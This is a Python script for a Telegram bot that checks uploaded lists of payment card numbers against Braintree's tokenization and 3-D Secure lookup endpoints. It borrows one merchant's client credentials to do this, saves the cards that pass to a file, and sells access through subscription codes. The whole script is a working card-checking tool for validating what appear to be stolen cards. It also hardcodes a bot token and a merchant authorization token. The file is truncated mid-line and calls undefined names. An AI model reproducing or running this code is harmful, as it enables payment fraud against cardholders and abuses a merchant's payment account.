import requests
import telebot
from telebot import types, apihelper
import json
import string
import secrets
import logging
from datetime import datetime, timedelta
import user_agent
import time
#بقولك اي بلاش تغير الحقوق سونس عمك هههههههههههههههههههههههههههههههههههههههههههههه


logging.basicConfig(level=logging.INFO, filename='bot.log', format='%(asctime)s - %(levelname)s - %(message)s')


photo_URL = 'https://t.me/p_g67/143'
ADMIN_ID = 7295052076
TOKEN = "7976982196:AAH8bRfCfP6_8OrR_QnNxoypUlt-jO_mfLE"
CHANNEL_URL = "https://t.me/I30_O"
DEVELOPER_URL = "https://t.me/M3OOC"
DEVELOPER_NAME = "𝗘𝗟 𝗦𝗢𝗡𝗦"
SPAM_CHANNEL_URL = "https://t.me/I30_O"
DEVELOPER_USERNAME = "@M3OOC"

BIN_INFO_FILE = 'bin_info.json'
SUBSCRIPTION_FILE = 'subscriptions.json'
VALID_CARDS_FILE = 'valid_cards.txt'

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")


is_checking = False
is_bot_active = True
report_data = {
    'total_cards': 0,
    'otp_cards': 0,
    'failed_cards': 0
}

def load_json_file(file_path):
    """Load JSON data from a file."""
    try:
        with open(file_path, 'r') as json_file:
            return json.load(json_file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError as e:
        logging.error(f"Error decoding JSON from {file_path}: {str(e)}")
        return {}

def save_json_file(file_path, data):
    """Save data to a JSON file."""
    try:
        with open(file_path, 'w') as json_file:
            json.dump(data, json_file, ensure_ascii=False, indent=4)
    except Exception as e:
        logging.error(f"Error saving JSON to {file_path}: {str(e)}")

def log_error(error_message):
    """Log errors to a file."""
    logging.error(error_message)

def get_bin_info(bin_number):
    """Retrieve BIN information from cache or API."""
    bin_info = load_json_file(BIN_INFO_FILE)
    
    if bin_number in bin_info:
        return bin_info[bin_number]
    
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_number}')
        response.raise_for_status()
        data = response.json()
        bin_data = {
            'bank': data.get('bank', {}).get('name', 'unknown'),
            'country_flag': data.get('country', {}).get('emoji', 'unknown'),
            'country': data.get('country', {}).get('name', 'unknown'),
            'brand': data.get('scheme', 'unknown'),
            'card_type': data.get('type', 'unknown'),
            'url': data.get('bank', {}).get('url', 'unknown')
        }
        bin_info[bin_number] = bin_data
        save_json_file(BIN_INFO_FILE, bin_info)
        return bin_data
    except requests.RequestException as e:
        log_error(f"Error fetching BIN info for {bin_number}: {str(e)}")
        return {
            'bank': 'unknown',
            'country_flag': 'unknown',
            'country': 'unknown',
            'brand': 'unknown',
            'card_type': 'unknown',
            'url': 'unknown'
        }

def brn(ccx):
    """Process card information and perform transactions."""
    ccx = ccx.strip()
    c, mm, yy, cvc = ccx.split("|")
    if "20" in yy:
        yy = yy.split("20")[1]
    r = requests.session()
    user = user_agent.generate_user_agent()#dolar
  #هنيجي هنا ونبدا نركب جزء جزء تمام   
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ca-ES;q=0.6,ca;q=0.5',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzczODI0OTEsImp0aSI6ImVjYjNhODgyLThkODctNGUzNy1iYzJlLTczMTBhNTY5YWRhYiIsInN1YiI6ImRyZDVycWdrdzZ3dGM1NXgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRyZDVycWdrdzZ3dGM1NXgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.wXw9QindOwbofbtlmR4HjB50hAJ6OGaxzv_RoJj8RgfyXd8RgvoAiEL2-0V4eqilnwnxsTFdl0gvHRUcwJppFw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'd5c1540c-774b-4f2e-aa07-7fdf38e0b9d7',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    try:
        tok = response.json()['data']['tokenizeCreditCard']['token']
    except:
        return 'Error Card'
    
    headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ca-ES;q=0.6,ca;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://www.woodbridgegreengrocers.co.uk',
    'referer': 'https://www.woodbridgegreengrocers.co.uk/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'amount': '44.85',
    'additionalInfo': {
        'billingLine1': 'Bevd',
        'billingLine2': 'Bevd',
        'billingCity': 'New York ',
        'billingState': '',
        'billingPostalCode': '10080',
        'billingCountryCode': 'GB',
        'billingPhoneNumber': '5685850587',
        'billingGivenName': 'Sons',
        'billingSurname': 'Masr',
        'email': 'ffffffffhfs@gmmail.com',
    },
    'bin': '533317',
    'dfReferenceId': '0_40cc09fa-506f-4962-a8b9-d0496683d707',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.94.0',
        'cardinalDeviceDataCollectionTimeElapsed': 114,

'issuerDeviceDataCollectionTimeElapsed': 580,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzczODI0OTEsImp0aSI6ImVjYjNhODgyLThkODctNGUzNy1iYzJlLTczMTBhNTY5YWRhYiIsInN1YiI6ImRyZDVycWdrdzZ3dGM1NXgiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImRyZDVycWdrdzZ3dGM1NXgiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.wXw9QindOwbofbtlmR4HjB50hAJ6OGaxzv_RoJj8RgfyXd8RgvoAiEL2-0V4eqilnwnxsTFdl0gvHRUcwJppFw',
    'braintreeLibraryVersion': 'braintree/web/3.94.0',
    '_meta': {
        'merchantAppId': 'www.woodbridgegreengrocers.co.uk',
        'platform': 'web',
        'sdkVersion': '3.94.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': 'd5c1540c-774b-4f2e-aa07-7fdf38e0b9d7',
    },
}
#اهم جزء انك تضيف الريسبونس بتاع الـlook up
    response = requests.post(
    f'https://api.braintreegateway.com/merchants/drd5rqgkw6wtc55x/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
)
    time.sleep(3)
    try:
        vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
    except KeyError:
        return 'Unknown Error ⚠️'

    if 'challenge_required' in vbv:
        return '3DS Challenge Required ❌'
    elif 'lookup_card_error' in vbv:
        return 'lookup_card_error ⚠️'
    elif 'lookup_error' in vbv:
        return 'Unknown Error ⚠️'
    return vbv

def check_bot_status(func):
    """Decorator to check if the bot is active before processing the message."""
    def wrapper(message):
        if not is_bot_active:
            bot.reply_to(message, "البوت مغلق حالياً. استخدم /on لتفعيله.", parse_mode="HTML")
            return
        return func(message)
    return wrapper

@bot.message_handler(commands=["start"])
@check_bot_status
def start(message):
    """Send the start message with bot information."""
    keyboard = types.InlineKeyboardMarkup()
    cmds_button = types.InlineKeyboardButton(text="𝐂𝐌𝐃𝐒", callback_data="cmds")
    keyboard.add(cmds_button)
    bot.send_photo(
        message.chat.id,
        photo=photo_URL,
        caption=f"Advertise with you in Maryam's booth for inspection 💋",
        reply_markup=keyboard
    )

@bot.callback_query_handler(func=lambda call: call.data == 'cmds')
@check_bot_status
def cmds_callback(call):
    """Handle command callback and show available commands."""
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row_width = 2
    keyboard.add(
        types.InlineKeyboardButton("𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url=SPAM_CHANNEL_URL),
        types.InlineKeyboardButton("𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑", url=DEVELOPER_URL)
    )

    try:
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=f'''<b> 
━━━━━━━━━━━━━━━━━━━━━━━━

 3d Lookup ✅
 <code>/vbv</code> Card|mm|yy||

━━━━━━━━━━━━━━━━━━━━━━━━</b>''',
            parse_mode='HTML',
            reply_markup=keyboard
        )
    except Exception as e:
        log_error(f"Error editing message: {str(e)}")

@bot.message_handler(commands=["off"])
def stop_bot(message):
    """Stop the bot from processing further messages."""
    global is_bot_active
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Only the bot owner can stop the bot.", parse_mode="HTML")
        return

    is_bot_active = False
    bot.reply_to(message, "The bot has been stopped. Use /on to restart.", parse_mode="HTML")

@bot.message_handler(commands=["on"])
def start_bot(message):
    """Start the bot to process messages."""
    global is_bot_active
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Only the bot owner can start the bot.", parse_mode="HTML")
        return

    is_bot_active = True
    bot.reply_to(message, "The bot is now active.", parse_mode="HTML")

@bot.message_handler(commands=["code"])
@check_bot_status
def create_code(message):
    """Create a subscription code for the bot."""
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Only the bot owner can create a subscription code.", parse_mode="HTML")
        return

    try:
        args = message.text.split(' ')[1:]
        if len(args) < 2:
            bot.reply_to(message, "Please provide the duration in hours and user limit.", parse_mode="HTML")
            return

        hours = int(args[0])
        user_limit = int(args[1])

        characters = string.ascii_uppercase + string.digits
        code = 'sonsmasr-' + ''.join(secrets.choice(characters) for _ in range(4)) + '-' + ''.join(secrets.choice(characters) for _ in range(4)) + '-' + ''.join(secrets.choice(characters) for _ in range(4))
        current_time = datetime.now()
        expiry_time = current_time + timedelta(hours=hours)
        plan = '𝗩𝗜𝗣'
        expiry_str = expiry_time.strftime('%Y-%m-%d %H:%M')

        new_data = {
            code: {
                "plan": plan,
                "time": expiry_str,
                "used_by": [],
                "user_limit": user_limit
            }
        }
        existing_data = load_json_file(SUBSCRIPTION_FILE)
        existing_data.update(new_data)
        save_json_file(SUBSCRIPTION_FILE, existing_data)

        msg = f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
        
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {expiry_str}
𝗞𝗘𝗬 ➜ <code>{code}</code>
        
𝗨𝗦𝗘 /redeem [𝗞𝗘𝗬]</b>'''
        bot.reply_to(message, msg, parse_mode="HTML")
    except ValueError:
        bot.reply_to(message, "Invalid input. Please enter numeric values for hours and user limit.", parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error creating subscription code: {str(e)}")
        bot.reply_to(message, "Error creating subscription code.", parse_mode="HTML")
        
@bot.message_handler(commands=['kil'])
def qwwe(message):
    if str(message.from_user.id) in myid:
        mp, erop = 0, 0
        try:
            idd = message.from_user.id
            mes = message.text.replace("/kil ", "")
            bot.send_message(idd, mes)

            # إرسال الرسائل للمشتركين من data.json
            with open('subscriptions.json', 'r') as file:
                json_data = json.load(file)

            for user_id, details in json_data.items():
                if check_user_plan(user_id):
                    try:
                        mp += 1
                        bot.send_message(user_id, text=mes)
                    except Exception as e:
                        erop += 1
                        print(f"Error sending message to user {user_id}: {e}")

            bot.reply_to(message, f'''- Hello admin
• Done Send - {mp}
• Bad Send - {erop}''')
        except Exception as err:
            bot.reply_to(message, f'- Was An error : {err}')
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

@bot.message_handler(commands=["redeem"])
@check_bot_status
def redeem_code(message):
    """Redeem a subscription code."""
    try:
        args = message.text.split(' ')
        if len(args) < 2:
            bot.reply_to(message, "Please provide a code to redeem!", parse_mode="HTML")
            return

        code = args[1].strip()
        user_id = message.from_user.id
        subscriptions = load_json_file(SUBSCRIPTION_FILE)

        if code not in subscriptions:
            bot.reply_to(message, "Invalid code!", parse_mode="HTML")
            return

        subscription = subscriptions[code]
        expiry_time = datetime.strptime(subscription['time'], '%Y-%m-%d %H:%M')

        if datetime.now() >= expiry_time:
            bot.reply_to(message, "Code expired!", parse_mode="HTML")
            return

        used_by = subscription.setdefault("used_by", [])
        if user_id in used_by:
            bot.reply_to(message, "You have already activated this subscription!", parse_mode="HTML")
            return

        if len(used_by) >= subscription['user_limit']:
            bot.reply_to(message, "User limit reached for this subscription code.", parse_mode="HTML")
            return

        used_by.append(user_id)
        save_json_file(SUBSCRIPTION_FILE, subscriptions)
        bot.reply_to(message, "Subscription activated!", parse_mode="HTML")
    except Exception as e:
        logging.error(f"Error redeeming subscription code: {str(e)}")
        bot.reply_to(message, "An error occurred while redeeming the code. Please try again later.", parse_mode="HTML")

@bot.message_handler(content_types=["document"])
@check_bot_status
def main(message):
    """Process uploaded document containing card data."""
    global is_checking, report_data
    user_id = message.from_user.id
    subscriptions = load_json_file(SUBSCRIPTION_FILE)

    if not any(user_id in sub.get("used_by", []) for sub in subscriptions.values()):
        bot.reply_to(message, f" انت غير مشترك راسل سونس✅{DEVELOPER_USERNAME}", parse_mode="HTML")
        return

    dd = 0
    ch = 0
    is_checking = True
    report_data = {
        'total_cards': 0,
        'otp_cards': 0,
        'failed_cards': 0
    }
    
    ko = bot.reply_to(message, "𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝗢𝗧𝗣").message_id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        with open("combo.txt", "wb") as w:
            w.write(downloaded_file)
        
        with open("combo.txt", 'r') as file:
            lines = file.readlines()
            report_data['total_cards'] = len(lines)
            
            for cc in lines:
                cc = cc.strip()
                if not is_checking:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="✅ تم انهاء العمليه بنجاح ✅", parse_mode="HTML")
                    return
                
                bin_data = get_bin_info(cc[:6])
                
                try:
                    last = str(brn(cc))
                    if "OTP" in last:
                        report_data['otp_cards'] += 1
                    elif "3DS Challenge Required ❌" not in last:
                        with open(VALID_CARDS_FILE, 'a') as valid_file:
                            valid_file.write(f"{cc}\n")
                except Exception as e:
                    last = 'Error Processing Card'
                    report_data['failed_cards'] += 1
                    logging.error(f"Error processing card {cc}: {str(e)}")

                msgs = f'''𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌ 
[↯] 𝗖𝗖 ⇾ {cc} 
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ 𝟯𝗗 𝗟𝗼𝗼𝗸𝗨𝗽
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → {cc[:6]} - {bin_data['card_type']} - {bin_data['brand']} 
[↯] 𝗕𝗮𝗻𝗸  → {bin_data['bank']} 
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {bin_data['country']} - {bin_data['country_flag']} 
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ {DEVELOPER_USERNAME}'''

                mes = types.InlineKeyboardMarkup(row_width=1)
                mero = types.InlineKeyboardButton(last, callback_data='u8')
                cm1 = types.InlineKeyboardButton(cc, callback_data='u8')
                cm2 = types.InlineKeyboardButton(f"𝗢𝘁𝗽 ✅ {ch}", callback_data='x')
                cm3 = types.InlineKeyboardButton(f"𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ {dd}", callback_data='x')
                stop = types.InlineKeyboardButton(f"𝐒𝐓𝐎𝐏 ⚠️ ", callback_data='stop')
                mes.add(mero, cm1, cm2, cm3, stop)
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩 𝙒𝙝𝙞𝙡𝙚 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙𝙨 𝘼𝙧𝙚 𝘽𝙚𝙞𝙣𝙜 𝘾𝙝𝙚𝙘𝙠 𝘼𝙩 𝙏𝙝𝙚 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 𝗢𝗧𝗣''', reply_markup=mes)

                if '3DS Challenge Required ❌' in last:
                    ch += 1
                    key = types.InlineKeyboardMarkup()
                    bot.send_message(message.chat.id, f"<strong>{msgs}</strong>", parse_mode="html", reply_markup=key)
                else:
                    dd += 1
                    time.sleep(3)
    
    except Exception as e:
        logging.error(f"Error processing document: {str(e)}")
        bot.reply_to(message, "An error occurred while processing the document. Please try again later.", parse_mode="HTML")
    
    finally:
        report_msg = f"• تم انتهاء الفحص بنجاح • ✅\n" \
                     f"[ تم فحص {report_data['total_cards']} بطاقه ]\n" \
                     f"[ عدد البطاقات ال OTP {report_data['otp_cards']} ]\n" \
                     f"[ عدد البطاقات الفاشله {report_data['failed_cards']} ]"
        bot.send_messageع
